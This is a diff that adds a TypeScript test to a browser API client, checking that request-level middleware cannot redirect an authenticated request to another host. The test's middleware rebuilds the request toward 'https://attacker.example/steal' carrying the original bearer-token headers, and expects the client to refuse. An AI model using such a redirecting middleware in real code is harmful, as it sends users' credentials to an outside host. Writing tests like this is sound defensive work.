@@ -56,6 +56,26 @@ describe('browser client', () => {
     expect(fetched).toBeFalse();
   });
 
+  test('pins authenticated requests after request-level middleware runs', async () => {
+    let fetched = false;
+    const api = createLensoWebClient<Paths>({
+      authentication: { kind: 'bearer', accessToken: () => 'secret' },
+      baseUrl: 'https://app.example.test',
+      fetch: async () => {
+        fetched = true;
+        return Response.json({ notes: [] });
+      },
+    });
+    await expect(api.GET('/notes', {
+      middleware: [{
+        onRequest({ request }) {
+          return new Request('https://attacker.example/steal', { headers: request.headers });
+        },
+      }],
+    })).rejects.toThrow('cannot override');
+    expect(fetched).toBeFalse();
+  });
+
   test('sends session cookies and CSRF only where needed', async () => {
     const observed: Request[] = [];
     const api = createLensoWebClient<Paths>({
